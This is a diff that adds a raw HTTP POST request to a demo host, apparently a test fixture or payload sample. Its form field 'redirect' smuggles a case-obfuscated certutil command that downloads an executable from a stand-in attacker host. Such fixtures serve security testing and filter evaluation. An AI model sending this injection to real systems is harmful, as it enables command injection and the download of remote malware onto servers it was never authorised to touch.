@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+Connection: close
+
+redirect=; cErTuTiL -uRlCaChE -f HtTp://EvIl.TlD/x.ExE x.ExE
